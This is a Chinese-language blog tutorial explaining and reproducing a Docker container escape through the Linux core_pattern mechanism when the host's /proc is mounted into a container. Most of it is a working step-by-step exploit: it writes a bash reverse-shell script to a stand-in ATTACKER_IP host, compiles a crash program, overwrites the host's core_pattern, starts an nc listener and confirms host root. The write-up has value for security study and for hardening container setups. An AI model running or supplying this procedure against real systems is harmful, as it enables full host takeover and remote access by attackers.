<h2 class="md-end-block md-heading"><span class="md-plain">一、原理剖析</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">（一）核心依赖：</span><span class="md-pair-s" spellcheck="false"><code>core_pattern</code></span><span class="md-plain"> 机制</span></h3>
<p class="md-end-block md-p"><span class="md-plain">Linux 内核借助 </span><span class="md-pair-s" spellcheck="false"><code>/proc/sys/kernel/core_pattern</code></span><span class="md-plain"> 文件，定义程序崩溃（core dump）时的行为规则。当该文件内容以 </span><span class="md-pair-s" spellcheck="false"><code>|</code></span><span class="md-plain"> 起始，剩余部分会被当作用户空间的程序或脚本执行，且执行时继承内核级权限，通常可获取宿主机 </span><span class="md-pair-s" spellcheck="false"><code>root</code></span><span class="md-plain"> 权限 。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">（二）容器逃逸条件</span></h3>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">特权环境</span></strong></span><span class="md-plain">：容器以 </span><span class="md-pair-s" spellcheck="false"><code>root</code></span><span class="md-plain"> 权限运行，且未启用 User Namespace，使得容器内 </span><span class="md-pair-s" spellcheck="false"><code>root</code></span><span class="md-plain"> 与宿主机 </span><span class="md-pair-s" spellcheck="false"><code>root</code></span><span class="md-plain"> 的 UID 均为 </span><span class="md-pair-s" spellcheck="false"><code>0</code></span><span class="md-plain">，权限未有效隔离 。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">路径挂载</span></strong></span><span class="md-plain">：宿主机 </span><span class="md-pair-s" spellcheck="false"><code>/proc</code></span><span class="md-plain"> 目录被挂载到容器内（如 </span><span class="md-pair-s" spellcheck="false"><code>/host/proc</code></span><span class="md-plain"> 路径 ），让容器有机会修改宿主机的 </span><span class="md-pair-s" spellcheck="false"><code>core_pattern</code></span><span class="md-plain"> 文件 。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">触发机制</span></strong></span><span class="md-plain">：通过人为制造程序崩溃（core dump），触发 </span><span class="md-pair-s" spellcheck="false"><code>core_pattern</code></span><span class="md-plain"> 中定义的恶意命令，进而实现逃逸 。</span></p>
</li>
</ol>
<h2 class="md-end-block md-heading md-focus"><span class="md-plain">二、复现步骤</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">（一）环境准备</span></h3>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">拉取镜像</span></strong></span><span class="md-plain">（在宿主机终端执行 ）：</span> <span class="md-plain">执行 </span><span class="md-pair-s" spellcheck="false"><code>docker pull ubuntu:18.04</code></span><span class="md-plain"> 命令，从 Docker 镜像仓库拉取 Ubuntu 18.04 镜像，为后续创建容器做准备 。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">启动特权容器</span></strong></span><span class="md-plain">（在宿主机终端执行 ）：</span> <span class="md-plain">运行 </span><span class="md-pair-s" spellcheck="false"><code>docker run -it --rm -v /proc:/host/proc ubuntu:18.04 /bin/bash</code></span><span class="md-plain"> 命令 。</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>--rm</code></span><span class="md-plain">：容器退出后自动清理相关资源，避免残留影响系统 。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>-v /proc:/host/proc</code></span><span class="md-plain">：关键挂载操作，将宿主机的 </span><span class="md-pair-s" spellcheck="false"><code>/proc</code></span><span class="md-plain"> 目录映射到容器内的 </span><span class="md-pair-s" spellcheck="false"><code>/host/proc</code></span><span class="md-plain"> 路径，这是后续利用 </span><span class="md-pair-s" spellcheck="false"><code>core_pattern</code></span><span class="md-plain"> 实现逃逸的基础条件 。</span></p>
</li>
</ul>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">（二）容器内操作：信息收集与准备</span></h3>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">确认 </span><span class="md-pair-s" spellcheck="false"><code>core_pattern</code></span><span class="md-plain"> 路径</span></strong></span><span class="md-plain">：</span> <span class="md-plain">在容器内执行 </span><span class="md-pair-s" spellcheck="false"><code>find / -name core_pattern 2&gt;/dev/null</code></span><span class="md-plain"> 命令，查找 </span><span class="md-pair-s" spellcheck="false"><code>core_pattern</code></span><span class="md-plain"> 文件位置 。</span> <span class="md-plain">正常输出会包含：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>/proc/sys/kernel/core_pattern</code></span><span class="md-plain">：容器内默认的 </span><span class="md-pair-s" spellcheck="false"><code>core_pattern</code></span><span class="md-plain"> 路径 。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>/host/proc/sys/kernel/core_pattern</code></span><span class="md-plain">：宿主机挂载到容器内的 </span><span class="md-pair-s" spellcheck="false"><code>core_pattern</code></span><span class="md-plain"> 路径，后续需对其进行篡改操作 。</span></p>
<img class="size-full wp-image-613 aligncenter" src="/wp-content/uploads/2025/img-adeb9ac07e41.png" alt="" width="557" height="55" /></li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">获取容器在宿主机的路径</span></strong></span><span class="md-plain">：</span> <span class="md-plain">执行 </span><span class="md-pair-s" spellcheck="false"><code>cat /proc/self/mountinfo | grep -i &quot;overlay&quot; | grep -oP &#039;(?&lt;=upperdir=).*?(?=,workdir=)&#039; | sed &#039;s/upper/merged/&#039;</code></span><span class="md-plain"> 命令，解析 </span><span class="md-pair-s" spellcheck="false"><code>mountinfo</code></span><span class="md-plain"> 文件，获取容器文件系统在宿主机的实际存储位置 。</span> <span class="md-plain">输出示例（需记录实际路径 ）：</span></p>

</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">（三）植入恶意脚本与崩溃程序</span></h3>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">编写反向 Shell 脚本</span></strong></span><span class="md-plain">（在容器内执行 ）：</span> <span class="md-plain">依次执行以下命令：</span></p>



```bash
echo '#!/bin/bash' > /tmp/rev.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' >> /tmp/rev.sh
chmod +x /tmp/rev.sh
```


<p class="md-end-block md-p"><span class="md-plain">其中，需将 </span><span class="md-pair-s" spellcheck="false"><code>ATTACKER_IP</code></span><span class="md-plain"> 和 </span><span class="md-pair-s" spellcheck="false"><code>ATTACKER_PORT</code></span><span class="md-plain"> 替换为攻击机实际的监听地址和端口，该脚本作用是尝试与攻击机建立反向 Shell 连接，让攻击者获取容器及后续宿主机的操作权限 。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">编写崩溃程序（触发 core dump）</span></strong></span><span class="md-plain">（在容器内执行 ）：</span> <span class="md-plain">执行一系列命令来创建、编写和编译 C 语言程序：</span></p>



```bash
echo '#include <stdio.h>' > crash.c
echo 'int main() { int *p = NULL; *p = 1; return 0; }' >> crash.c
gcc crash.c -o crash
```


<p class="md-end-block md-p"><span class="md-plain">此 C 程序通过空指针解引用操作，人为制造段错误（Segmentation fault），触发 core dump ，为执行 </span><span class="md-pair-s" spellcheck="false"><code>core_pattern</code></span><span class="md-plain"> 中恶意命令创造条件 。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">（四）篡改 </span><span class="md-pair-s" spellcheck="false"><code>core_pattern</code></span><span class="md-plain"> 并触发逃逸</span></h3>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">修改宿主机 </span><span class="md-pair-s" spellcheck="false"><code>core_pattern</code></span></strong></span><span class="md-plain">（在容器内执行 ）：</span> <span class="md-plain">将宿主机的 </span><span class="md-pair-s" spellcheck="false"><code>core_pattern</code></span><span class="md-plain"> 配置指向容器内的恶意脚本，执行命令（需替换实际的容器在宿主机路径 ）：</span></p>



```bash
echo "|$(容器在宿主机的路径)/tmp/rev.sh" > /host/proc/sys/kernel/core_pattern
<img class="size-full wp-image-615 aligncenter" src="/wp-content/uploads/2025/img-818a2a179250.png" alt="" width="859" height="171" />
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">攻击机启动监听</span></strong></span><span class="md-plain">（在攻击机终端执行 ）：</span> <span class="md-plain">运行 </span><span class="md-pair-s" spellcheck="false"><code>nc -lvvp ATTACKER_PORT</code></span><span class="md-plain"> 命令，让攻击机在指定端口（需与反向 Shell 脚本中设置的端口一致 ）监听，等待容器触发恶意脚本后建立连接 。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">触发 core dump</span></strong></span><span class="md-plain">（在容器内执行 ）：</span> <span class="md-plain">执行 </span><span class="md-pair-s" spellcheck="false"><code>./crash</code></span><span class="md-plain"> 命令，运行编译好的崩溃程序，程序执行会触发段错误（Segmentation fault），进而产生 core dump ，触发 </span><span class="md-pair-s" spellcheck="false"><code>core_pattern</code></span><span class="md-plain"> 中定义的恶意脚本执行 。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">（五）验证逃逸结果</span></h3>
<p class="md-end-block md-p"><span class="md-plain">当攻击机监听端收到反向 Shell 连接后，在攻击机终端执行 </span><span class="md-pair-s" spellcheck="false"><code>id</code></span><span class="md-plain"> 命令验证权限 。</span> <span class="md-plain">若输出 </span><span class="md-pair-s" spellcheck="false"><code>uid=0(root) gid=0(root) groups=0(root)</code></span><span class="md-plain"> ，则表明成功从容器逃逸到宿主机，并获取了宿主机的 </span><span class="md-pair-s" spellcheck="false"><code>root</code></span><span class="md-plain"> 权限 。</span></p>
